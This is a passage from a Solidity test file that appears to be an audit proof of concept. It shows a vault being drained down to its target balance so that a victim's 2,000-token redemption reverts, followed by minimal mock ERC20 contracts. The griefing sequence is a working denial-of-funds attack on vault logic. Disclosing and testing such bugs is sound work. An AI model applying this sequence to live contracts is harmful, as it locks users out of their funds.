f);\n        console.log(\"Funds moved to Custodian: %s\", custodianBalance);\n\n        // Verify Vault is drained down to the minimum target\n        assertEq(vaultBalanceAfterGrief, newTarget, \"Vault should be drained to exactly target\");\n\n        // --- STEP 4: VICTIM TRIES TO REDEEM ---\n        // A victim (or even the same user) tries to redeem 2,000 tokens.\n        // Theoretically, the system just took in 5,000, so 2,000 should be easy to payout.\n        // But because of the griefing, the Vault only holds 1,500.\n        console.log(\"\\nStep 4: Victim tries to redeem 2,000 tokens\");\n        \n        vm.startPrank(address(issuer)); // Only issuer can call processTransfer\n        \n        // Victim needs 2,000\n        uint256 redeemAmount = 2_000 ether; \n\n        // Check if vault has enough\n        if (dlfToken.balanceOf(address(vault)) < redeemAmount) {\n            console.log(\"RESULT: Redemption FAILED! Vault has insufficient funds.\");\n            console.log(\"Required: %s\", redeemAmount);\n            console.log(\"Available: %s\", dlfToken.balanceOf(address(vault)));\n        }\n\n        // Expect Revert due to logic in processTransfer line 147\n        vm.expectRevert(); \n        vault.processTransfer(victim, redeemAmount);\n        \n        vm.stopPrank();\n        \n        console.log(\"\\n=== PoC Conclusion: Fast Access Denied ===\");\n    }\n}\n\n// ==========================================\n// MOCKS (Minimal implementation for PoC)\n// ==========================================\n\ncontract MockERC20 {\n    string public name;\n    string public symbol;\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalSupply;\n\n    constructor(string memory _name, string memory _symbol) {\n        name = _name;\n        symbol = _symbol;\n    }\n\n    function mint(address to, uint256 amount) external {\n        balanceOf[to] += amount;\n        totalSupply += amount;\n    }\n\n    function transfer(address to,